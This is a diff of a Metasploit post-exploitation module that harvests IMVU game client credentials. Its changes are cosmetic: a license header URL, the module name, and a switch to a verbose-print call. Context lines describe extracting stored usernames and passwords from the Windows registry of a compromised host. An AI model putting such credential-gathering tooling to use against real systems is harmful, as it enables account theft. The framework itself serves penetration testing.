@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -24,7 +24,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'Post Windows Gather Credentials IMVU Game Client',
+			'Name'           => 'Windows Gather Credentials IMVU Game Client',
 			'Description'    => %q{
 				This module extracts account username & password from the IMVU game client
 				and stores it as loot.
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
 		userhives.each do |hive|
 			next if hive['HKU'] == nil
 
-			print_status("Looking at Key #{hive['HKU']}") if datastore['VERBOSE']
+			vprint_status("Looking at Key #{hive['HKU']}")
 			subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
 			if subkeys.nil? or subkeys.empty?
 				print_status ("IMVU not installed for this user.")
